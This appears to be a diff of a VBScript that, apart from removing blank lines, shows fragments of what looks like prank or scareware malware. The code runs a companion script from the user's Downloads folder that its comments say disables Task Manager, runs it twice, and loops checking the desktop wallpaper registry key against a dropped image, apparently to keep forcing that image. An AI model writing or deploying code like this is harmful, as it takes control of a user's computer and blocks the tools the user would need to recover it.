@@ -44,7 +44,6 @@ Next
 objFile.Close
 Set objFSO = Nothing
 'Set subfolder for disabling task manager
-
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 strUsername = CreateObject("WScript.Network").UserName
 strFolder = "C:\Users\" & strUsername & "\Downloads"
@@ -73,8 +72,6 @@ For Each line In lines
 Next
 objFile.Close
 Set objFSO = Nothing
-
-
 'Set image
 WScript.Sleep 2000
 Dim objShell
@@ -84,10 +81,8 @@ strPath = strProfileFolder & "\Downloads\LemonZS.vbs"
 strDisableTaskManager = strProfileFolder & "\Downloads\LemonZST.vbs"
 Set objNetwork = CreateObject("WScript.Network")
 strUsername = objNetwork.UserName
-
 objShell.Run strDisableTaskManager
 objShell.Run strDisableTaskManager
-
 Do
     strDesktopWallpaper = objShell.RegRead("HKCU\Control Panel\Desktop\Wallpaper")
     If StrComp(strDesktopWallpaper, "C:\Users\" & strUsername & "\Downloads\LemonZS.jpg", vbTextCompare) = 0 Then
